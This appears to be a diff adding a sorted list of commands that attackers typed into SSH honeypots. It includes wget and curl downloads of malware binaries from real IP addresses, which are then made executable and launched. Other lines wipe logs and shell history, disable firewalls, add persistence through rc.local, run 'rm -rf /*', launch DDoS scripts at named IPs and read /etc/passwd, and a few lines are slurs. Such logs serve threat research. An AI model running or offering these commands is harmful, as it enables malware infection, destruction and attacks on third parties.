@@ -1,0 +1,730 @@
+-h
+-help
+-su
+-su wall
+./
+./..log
+./11484 &
+./2222sa.32
+./2222saa.64
+./AGZXVA
+./ASDG485SW
+./Gates
+./Gates &
+./Gates2.4
+./Gates2.4 &
+./GatesB &
+./Linux.host &
+./Linux.tese &
+./Linux2 &
+./Linux2.4 &
+./Linux2.6 &
+./Linux24 &
+./Linux4 &
+./Linuxer &
+./Lnux26 &
+./OLinux2.4 &
+./OLinux2.6
+./OLinux2.6 &
+./Odd.wrt &
+./Olinux-arm &
+./Olinux-mips
+./Olinux-mips &
+./Talk
+./a 180.69
+./a 95.88
+./admin &
+./admin1 &
+./arm
+./autorun
+./baidu
+./bbs
+./cevers
+./dd-wrt &
+./init
+./lack
+./linux
+./linux-arm &
+./linux-arm32 &
+./linux-mips &
+./linux-mips35 &
+./linux-mm &
+./linux-mm&
+./linux-xxy &
+./linux-xxy&
+./linux.arm &
+./linux.e &
+./linux.mips &
+./lu-wrt
+./ly-mips
+./mass 122
+./mxivv &
+./npc
+./npc1
+./php_linux &
+./pico
+./rekkeh 184.58.120.126 53 200 100000
+./rpmbuild
+./run
+./runx
+./start 208.66.
+./svchost
+./svshost
+./tali
+./tall
+./testmaicn &
+./testmaizn
+./tfedl
+./tfeds
+./tmp/Linux2.6 &
+./tmp/OLinux2.4
+./tmp/OLinux2.6
+./tmp/OLinux2.6 &
+./tmp/Olinux-mips
+./tmp/host.root
+./tmp/host.test
+./tmp/svchost
+./tmp/svshost
+./tmp/testmaicn
+./tmp/testmaizn
+./tmp/txmaz
+./tmp/xuxdp
+./txmaz &
+./unix 153.120
+./vido.32 &
+./vido.64 &
+./xudpyf
+./xuxdp &
+./youku.TSm
+./zccaa &
+.CIRRRR
+.Linux2 &
+.Linux66 &
+.Linuxz2 &
+.dasd656 &
+.ddsa554 &
+.linux45 &
+.linux54 &
+/./
+/etc/init.d/iptables stop
+/root/.../init
+/sbin/ifconfig
+/tmp/./npc
+/tmp/./npc1
+/tmp/OLinux2.4
+/tmp/OLinux2.6
+/tmp/OLinux2.6 &
+/tmp/Olinux-mips
+/tmp/host.root
+/tmp/host.test
+/tmp/svshost
+/tmp/testmaicn
+/tmp/testmaicn &
+/tmp/testmaizn
+/tmp/txmaz
+/tmp/xuxdp
+0h
+1337
+FLRFLOCEA52F%3143A$!BOGDANQazxsR2!DQazsFLO
+FUCK
+SuSEfirewall2 stop
+YOU
+admin
+apropos
+apt-get
+apt-get  install pico
+apt-get vi
+aptitude
+awk
+ballz1337
+bash
+busybox wget http://221.234.43.146:8080/Gates
+busybox wget http://221.234.43.146:8080/Gates2.4
+cake
+cat
+cat .bashrc
+cat .mysql_history
+cat .sqlite_history
+cat /etc/*release
+cat /etc/httpd/conf/httpd.conf
+cat /etc/issue
+cat /etc/passwd
+cat /proc//\\cpuinfo
+cat /proc/cpuinfo
+cat /proc/cpuinfo | grep "model name"
+cat /proc/version
+cat dmesg
+cat httpd.conf
+cd
+cd " "
+cd -ls
+cd ..
+cd ...
+cd ../
+cd ../../..
+cd ./"-   "
+cd .ICE-UNIX
+cd .exploit
+cd .shadow
+cd /
+cd /home
+cd /root
+cd /root/...
+cd /tmp
+cd /tmp && curl -O http://172.245.179.130/.x.pl && perl .x.pl && rm -rf .x.pl && rm -rf .bash_history && rm -rf /var/log/* && history -c
+cd /tmp && curl -O http://shapangboy.byethost6.com/wp-content/.x.pl && perl .x.pl && rm -rf .x.pl && rm -rf .bash_history && rm -rf /var/log/* && history -c
+cd /tmp && wget http://192.99.151.119/getbinaries.sh && sh getbinaries.sh
+cd /tmp && wget http://95.85.15.126/.xsh && sh .x.sh && rm -rf .x.sh && history -c
+cd /tmp && wget http://shapangboy.byethost6.com/wp-content/.x.pl && perl .x.pl && rm -rf .x.pl && rm -rf .bash_history && rm -rf /var/log/* && history -c
+cd /var
+cd /var/tmp
+cd Afgan
+cd actmech
+cd anaconda
+cd apache
+cd apachge
+cd bin
+cd boot
+cd cd ..
+cd conf
+cd dev/
+cd dev/shm
+cd dionaea
+cd dmesg
+cd emech
+cd etc
+cd home
+cd html
+cd httpd
+cd include
+cd kippo
+cd kippo-0.8
+cd kippo-graph
+cd local
+cd mech
+cd media
+cd mnt
+cd mrtc
+cd opt
+cd pwd
+cd root
+cd root/
+cd rpmbuild
+cd scanbun
+cd share
+cd specs
+cd sys
+cd uptime
+cd usr
+cd var
+cd www
+cd ~
+chattr +i ./testmaicn
+chattr +i .svshost
+chattr +i /tmp/.svchost
+chattr +i /tmp/.testmaizn
+chattr +i Linux.host
+chattr +i Linux.tese
+chattr +i Linux24
+chattr +i admin
+chattr +i admin1
+chattr +i bbs
+chattr +i linux-arm32
+chattr +i linux-mips35
+chattr +i linux.arm
+chattr +i linux.mips
+chattr +i testmaicn
+chattr +i txmaz
+chattr +i vido.32
+chattr +i vido.64
+chattr +i xuxdp
+chmod +x *
+chmod +x ..log
+chmod 0755 ./bin.sh
+chmod 0755 ./npc
+chmod 0755 ./npc1
+chmod 0755 /root/testmaizn
+chmod 0755 /root/zccaa
+chmod 0755 /tmp/./npc
+chmod 0755 /tmp/./npc1
+chmod 0755 /tmp/Linux2.6
+chmod 0755 /tmp/OLinux2.4
+chmod 0755 /tmp/OLinux2.6
+chmod 0755 /tmp/Olinux-mips
+chmod 0755 /tmp/svchost
+chmod 0755 /tmp/testmaizn
+chmod 0755 /usr/bin/chattr
+chmod 0755 bbs
+chmod 0755 mxivv
+chmod 0755 pps
+chmod 0755 testmaizn
+chmod 0775 h.Mm2
+chmod 0775 x.TSm
+chmod 0777 /tmp/OLinux2.4
+chmod 0777 11484
+chmod 0777 Linux.host
+chmod 0777 Linux.tese
+chmod 0777 Linux24
+chmod 0777 Linuxer
+chmod 0777 Lnux26
+chmod 0777 linux.arm
+chmod 0777 linux.mips
+chmod 0777 php_linux
+chmod 0777 txmaz
+chmod 0777 vido.32
+chmod 0777 xuxdp
+chmod 777 *
+chmod 777 /tmp/OLinux2.6
+chmod 777 /tmp/Olinux-mips
+chmod 777 /tmp/host.root
+chmod 777 /tmp/host.test
+chmod 777 /tmp/svchost
+chmod 777 /tmp/svshost
+chmod 777 /tmp/testmaicn
+chmod 777 /tmp/testmaizn
+chmod 777 /tmp/txmaz
+chmod 777 /tmp/xuxdp
+chmod 777 2222sa.32
+chmod 777 2222saa.64
+chmod 777 AGZXVA
+chmod 777 ASDG485SW
+chmod 777 Gates
+chmod 777 Linux2
+chmod 777 Linux2.6
+chmod 777 Linux4
+chmod 777 Linux66
+chmod 777 Linuxz2
+chmod 777 OLinux2.4
+chmod 777 Odd.wrt
+chmod 777 Olinux-arm
+chmod 777 Olinux-mips
+chmod 777 Talk
+chmod 777 admin
+chmod 777 admin1
+chmod 777 arm
+chmod 777 baidu
+chmod 777 cevers
+chmod 777 dasd656
+chmod 777 dd-wrt
+chmod 777 ddsa554
+chmod 777 lack
+chmod 777 linux-arm
+chmod 777 linux-arm32
+chmod 777 linux-mips
+chmod 777 linux-mips35
+chmod 777 linux-mm
+chmod 777 linux-xxy
+chmod 777 linux.e
+chmod 777 linux45
+chmod 777 linux54
+chmod 777 lu-wrt
+chmod 777 ly-mips
+chmod 777 start
+chmod 777 svchost
+chmod 777 tali
+chmod 777 tall
+chmod 777 testmaicn
+chmod 777 testmaizn
+chmod 777 tfedl
+chmod 777 tfeds
+chmod 777 txmaz
+chmod 777 vido.32
+chmod 777 vido.64
+chmod 777 xudpyf
+chmod 777 youku.TSm
+chmod u+x Linux.host
+chmod u+x Linux.tese
+chmod u+x Linux2
+chmod u+x Linux24
+chmod u+x Linux4
+chmod u+x Linux66
+chmod u+x Linuxz2
+chmod u+x Lnux26
+chmod u+x OLinux2.4
+chmod u+x Odd.wrt
+chmod u+x Olinux-arm
+chmod u+x Olinux-mips
+chmod u+x dasd656
+chmod u+x dd-wrt
+chmod u+x ddsa554
+chmod u+x linux-arm32
+chmod u+x linux-mips35
+chmod u+x linux-mm
+chmod u+x linux-xxy
+chmod u+x linux.arm
+chmod u+x linux.mips
+chmod u+x linux45
+chmod u+x linux54
+chmod u+x php_linux
+chmod u+x testmaicn
+chmod u+x txmaz
+chmod u+x vido.32
+chmod u+x vido.64
+chmod u+x xuxdp
+chmod u+x zccaa
+chomd +x Gates
+chomd +x Gates2.4
+chomd +x GatesB
+chomd 0755 Linux2.4
+ciiirrrrrrr
+clear
+command
+command -v $d >/dev/null 2>1 && down=$d && break
+cp w_karunska-kiev-ua_9d1938cc@karunska-kiev-ua.1gb.ua:~/.../o/e.tgz .
+cs ..
+csh
+curl -o /tmp/OLinux2.4
+curl -o /tmp/OLinux2.6
+curl -o /tmp/Olinux-mips
+curl -o /tmp/host.root
+curl -o /tmp/host.test
+curl -o /tmp/svchost
+curl -o /tmp/svshost
+curl -o /tmp/testmaicn
+curl -o /tmp/testmaizn
+curl -o /tmp/txmaz
+curl -o /tmp/xuxdp
+curl google.com
+curl http://103.39.77.175:8080/npc -o /tmp/npc
+curl http://218.244.148.238:8080/npc -o /tmp/npc
+curl http://218.244.148.238:8080/npc1 -o /tmp/npc1
+cvat /etc/pass
+cvat /etc/passwd
+df -h
+dir
+dmesg
+do i=$(($i+1))
+do x=`readlink $i/exe|grep /boot/`
+done
+eat cake
+echo "./.svchost&">>/etc/rc.local
+echo "./.svshost&">>/etc/rc.local
+echo "./.testmaicn&">>/etc/rc.local
+echo "./.testmaizn&">>/etc/rc.local
+echo "./testmaicn&">>/etc/rc.local
+echo "/etc/init.d/iptables stop">>/etc/rc.local
+echo "WinSCP: this is end-of-file:0"
+echo "cd  /root/">>/etc/rc.local
+echo "cd /tmp">>/etc/rc.local
+echo ===
+ed httpd.conf
+edit
+exit
+export PATH=$PATH:/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin:/boot/:/usr/:/:/etc/
+exutit
+fi
+find
+find httpd.conf
+for d in `echo wget curl`
+for i in /proc/[[:digit:]]*
+free -m
+gcc
+grep dmesg
+hello user
+help
+hi guys , since you log it: hello world
+hist
+history
+history -c
+http://183.61.171.132:65511/laek
+httpd.conf
+i
+id
+if [ ! -z "$x" ]
+ifconfig
+init
+install
+iptables -F
+jackedbyrekkeh69
+killall armv7cc
+killall loese
+killall qt.exe
+killall socket5_ar
+killall socket5_davinci
+ks
+last
+list
+locate
+locate httpd.conf
+logout
+lol
+ls
+ls -a
+ls -al
+ls -l
+ls -la
+ls -la /var/run/sftp.pid
+ls -la /var/run/udev.pid
+ls -ls
+ls -ol
+ls 0l
+ls l
+man
+mkdir " "
+mkdir ./"-   "
+mkdir Rekkeh is GOD
+moemoenju000
+mv emech/ /root/...
+nano
+nano dmesg
+nano hostname
+nano mech.set
+netstat
+netstat -a
+netstat -an
+newuser
+nigger1
+nmap
+nohup ./bbs > /dev/null 2>&1 &
+nohup ./bin.sh> /dev/null 2>&1 &
+nohup ./h.Mm2 > /dev/null 2>&1 &
+nohup ./pps > /dev/null 2>&1 &
+nohup ./x.TSm > /dev/null 2>&1 &wget http://104.194.12.131:8080/h.Mm2
+nohup /root/testmaizn>/dev/null 2>&1
+nohup /root/zccaa > /dev/null 2>& 1&
+nohup /tmp/OLinux2.4 > /dev/null 2>&1
+nohup /tmp/OLinux2.6 > /dev/null 2>&1
+nohup /tmp/Olinux-mips > /dev/null 2>&1
+nohup /tmp/host.root > /dev/null 2>&1
+nohup /tmp/host.test > /dev/null 2>&1
+nohup /tmp/svchost > /dev/null 2>&1
+nohup /tmp/testmaicn > /dev/null 2>&1
+nohup /tmp/testmaizn > /dev/null 2>&1
+nohup /tmp/testmaizn>/dev/null 2>&1
+nohup /tmp/txmaz > /dev/null 2>&1
+nohup /tmp/xuxdp > /dev/null 2>&1
+open httpd.conf
+passwd
+passwd noah
+passwd root
+passwd root lol
+pel
+perl
+perl ddos.txt 170.178.191.18
+perl ddos.txt 91.236.182.1
+perl ddos.txt 94.125.182.255
+perl rekkeh 184.58.120.126 53 200 100000
+perl run.pl
+pico
+pico httpd.conf
+pico mech.set
+ping google.com
+pomfsquad
+ps
+ps -0
+ps -auxw
+ps -ef
+ps x
+pwd
+quit
+reSuSEfirewall2 stop
+reboot
+rekkehlol69
+rm *
+rm *.*
+rm -R *
+rm -f kippo-graph
+rm -rf  ddos.txt
+rm -rf $path || /dev/null > $path
+rm -rf /*
+rm -rf Afgan.tgz
+rm -rf actmech.tgz
+rm -rf b2.txt
+rm -rf e.tgz
+rm -rf index.html
+rm -rf kippo-graph
+rm -rf linux
+rm -rf log.tgz
+rm -rf uptime
+rm -rf uptime.tgz
+rm -rf vuln.txt
+rm -rf x
+rm /tmp/*
+rm hostname
+rm pwd
+rmdir
+rmdir -R dionaea
+rmdir dionaea
+scp w_karunska-kiev-ua_9d1938cc@karunska-kiev-ua.1gb.ua:~/.../o/e.tgz .
+sed httpd.conf
+service iptables stop
+sh -e stop.sh
+shutdown -h now
+sl
+source httpd.conf
+ssh enju@157.7.201.132
+start.sh
+stop.sh
+su root
+su sudo
+su wall
+sudo
+sudo install perl
+sudo shutdown -h now
+sudo su
+tar -xvf s1.tgz
+tar -xvf ssh1.tar
+tar -xzvf e.tgz
+tar xvf shadowfire.jpgtar xvf shadowfire.jpg
+tar xzvf exploit.tgz
+tar zxvf /var/tmp/Afgan.tgz
+tar zxvf Afgan.tgx
+tar zxvf actmech.tgz
+tar zxvf log.tgz
+tar zxvf mech.tgz
+tar zxvf pico.jpg
+tar zxvf shadowfire.jpg
+tar zxvf uptime.tgz
+tc/init.d/iptables stop
+then kill -9 `echo "$i"|awk -F "/" '{print $3}'`
+top
+touch x
+type $d >/dev/null 2>1 && down=$d && break
+unam
+uname -a
+uname -asr
+uname -i
+uname -m
+until
+uptime
+urpmi
+useradd
+useradd root
+usernew
+users
+vi
+vi dmesg
+vi hostname
+vi httpd.conf
+vi mech.set
+vi pass_file
+vim dmesg
+vim hostname
+vim httpd.conf
+vim mech.set
+w
+wall
+wall <hello user you have been compromised >
+wall hello user you have been compromised
+wget
+wget  http://104.194.12.131:8080/x.TSm
+wget  http://222.186.15.209:3421/xuxdp
+wget  http://222.186.52.53:4876/txmaz
+wget -O /tmp/Linux2.6 http://222.186.15.209:6654/Linux2.6
+wget -O /tmp/OLinux2.4 http://222.186.15.209:8080/OLinux2.4
+wget -O /tmp/OLinux2.6 http://222.186.15.209:8080/OLinux2.6
+wget -O /tmp/OLinux2.6 http://222.186.15.209:8080/Olinux-mips
+wget -O /tmp/host.root http://222.186.15.209:3421/host.root
+wget -O /tmp/host.test http://222.186.15.209:3421/host.test
+wget -O /tmp/linuxdoor http://50.117.96.156:8080/linuxdoor
+wget -O /tmp/svchost http://222.186.15.209:8080/svchost
+wget -O /tmp/svshost http://222.186.15.209:8080/svshost
+wget -O /tmp/testmaicn http://60.173.10.15:8080/testmaicn
+wget -O /tmp/testmaizn http://222.186.15.209:8080/testmaizn
+wget -O /tmp/testmaizn http://60.173.10.15:8080/testmaizn
+wget -O /tmp/txmaz http://222.186.15.209:3421/txmaz
+wget -O /tmp/txmaz http://222.186.52.53:3421/txmaz
+wget -O /tmp/xuxdp http://222.186.52.53:3421/xuxdp
+wget -c http://117.135.135.122:8088/cevers
+wget -c http://182.231.121.108/2222sa.32
+wget -c http://182.231.121.108/2222saa.64
+wget -c http://183.61.171.132:65511/Talk
+wget -c http://183.61.171.132:65511/laek
+wget -c http://202.85.211.220:33162/AGZXVA
+wget -c http://221.234.43.146:8080/Gates
+wget -c http://222.186.21.10/baidu
+wget -c http://222.186.21.10/youku.TSm
+wget -c http://222.186.21.55/arm
+wget -c http://222.186.21.55/lu-wrt
+wget -c http://222.186.21.55/ly-mips
+wget -c http://222.186.21.55/tali
+wget -c http://222.186.21.55/tall
+wget -c http://222.186.21.55/tfedl
+wget -c http://222.186.21.55/tfeds
+wget -c http://222.186.51.236:38487/xudpyf
+wget -c http://61.191.56.62:8080/ASDG485SW
+wget ame.xp3.biz/scan/Afgan.tgz
+wget database.do.am/exploit/exploit.tgz
+wget http://103.39.77.175:8080/bin.sh
+wget http://103.39.77.175:8080/npc
+wget http://104.194.12.131:8080/h.Mm2
+wget http://107.160.36.145:7373/mxivv
+wget http://117.25.156.136:65511/Linux2
+wget http://117.25.156.136:65511/Linux4
+wget http://117.25.156.136:65511/Linux66
+wget http://117.25.156.136:65511/Linuxz2
+wget http://117.25.156.136:65511/dasd656
+wget http://117.25.156.136:65511/dd-wrt
+wget http://117.25.156.136:65511/ddsa554
+wget http://117.25.156.136:65511/linux-mm
+wget http://117.25.156.136:65511/linux-xxy
+wget http://117.25.156.136:65511/linux45
+wget http://117.25.156.136:65511/linux54
+wget http://117.25.156.136:65511/vido.32
+wget http://117.25.156.136:65511/vido.64
+wget http://118.123.6.95:2587/bbs
+wget http://118.123.6.95:2587/pps
+wget http://122.114.126.232:889/1433
+wget http://183.60.197.158:8080/b80101
+wget http://218.244.148.238:8080/bin.sh
+wget http://218.244.148.238:8080/npc
+wget http://218.244.148.238:8080/npc1
+wget http://219.235.0.251:12345/admin
+wget http://219.235.0.251:12345/admin1
+wget http://221.234.43.146:8080/Gates
+wget http://221.234.43.146:8080/Gates2.4
+wget http://221.234.43.146:8080/GatesB
+wget http://222.136.81.12:520/php_linux
+wget http://222.186.15.209:3421/Linux24
+wget http://222.186.15.209:3421/Lnux26
+wget http://222.186.15.209:3421/linux-mips35
+wget http://222.186.15.209:3421/linux.arm
+wget http://222.186.15.209:3421/linux.mips
+wget http://222.186.15.209:4876/Linux.host
+wget http://222.186.15.209:4876/Linux.tese
+wget http://222.186.15.209:6654/Linux2.4
+wget http://222.186.15.209:6654/dd-wrt
+wget http://222.186.15.209:6654/linux-arm
+wget http://222.186.15.209:6654/linux-mips
+wget http://222.186.15.209:6654/linux.e
+wget http://222.186.15.209:8080/OLinux2.4
+wget http://222.186.15.209:8080/Odd.wrt
+wget http://222.186.15.209:8080/Olinux-arm
+wget http://222.186.15.209:8080/Olinux-mips
+wget http://222.186.15.209:8080/testmaicn
+wget http://222.186.15.209:8080/zccaa
+wget http://222.186.21.56:9991/11484
+wget http://222.186.21.56:9991/Linuxer
+wget http://222.186.52.53:4876/linux-arm32
+wget http://222.186.52.53:4876/linux-mips35
+wget http://222.186.52.53:4876/vido.32
+wget http://222.186.52.53:4876/vido.64
+wget http://actafool.ucoz.hu/actmech.tgz
+wget http://actafool.ucoz.hu/log.tgz
+wget http://actafool.ucoz.hu/mech.tgz
+wget http://actafool.ucoz.hu/uptime.tgz
+wget http://dinoo.fisierul.ro/shadowfire.jpg
+wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
+wget http://lgnclan.com/rekkeh
+wget http://mrunix.free.fr/ssh1.tar
+wget http://nobody.at.ua/ddos.txt
+wget http://root-arhive.serveftp.com/altele/pico.jpg
+wget http://www.appolo-online.com/deviceservices.zip
+wget http://www.appolo-online.com/visitas.txt
+wget karunska-kiev-ua.1gb.ua/e.tgz
+wget oper.altervista.org/b2.txt
+wget perl
+wget rename.altervista.org/s1.tgz
+wget service iptables stop
+whoami
+wq
+write root
+xdg-open httpd.conf
+yes
+your ips are logged too
+yum
+yum install
+yum install perl
+yum install pico
+yum isntall
+yum pico
